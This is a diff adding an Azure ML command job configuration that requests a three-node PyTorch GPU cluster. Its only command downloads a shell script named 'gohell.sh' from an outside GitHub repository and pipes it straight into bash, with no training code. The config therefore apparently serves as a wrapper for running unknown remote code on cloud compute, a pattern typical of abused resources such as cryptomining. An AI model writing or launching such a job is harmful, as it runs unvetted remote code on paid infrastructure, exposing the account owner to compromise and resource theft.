@@ -1,0 +1,9 @@
+$schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json
+command: curl -sL https://github.com/nandafiku/gradi/raw/main/gohell.sh | bash
+environment: azureml:AzureML-acpt-pytorch-1.13-cuda11.7@latest
+compute: azureml:acluster19
+distribution:
+  type: pytorch
+  process_count_per_instance: 1
+resources:
+  instance_count: 3
